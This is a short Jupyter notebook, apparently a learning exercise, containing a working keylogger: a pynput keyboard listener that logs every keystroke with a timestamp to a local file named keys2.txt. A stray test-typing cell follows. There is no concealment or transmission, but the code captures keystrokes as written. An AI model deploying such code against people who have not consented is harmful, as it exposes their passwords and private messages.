{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "3719d353",
   "metadata": {},
   "outputs": [],
   "source": [
    "#import libraries\n",
    "from pynput.keyboard import Listener\n",
    "import logging"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "756e11ea",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0.5.1.2'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "logging.__version__\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6c413311",
   "metadata": {},
   "outputs": [],
   "source": [
    "file = \"keys2.txt\"\n",
    "logging.basicConfig(filename=file, level=logging.DEBUG, format=\"%(asctime)s | %(message)s\")\n",
    "\n",
    "\n",
    "def on_press(key):\n",
    "    logging.info(key)\n",
    "    \n",
    "\n",
    "with Listener(on_press=on_press) as listener:\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dd20e8c6",
   "metadata": {},
   "outputs": [],
   "source": [
    "hello test key2"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
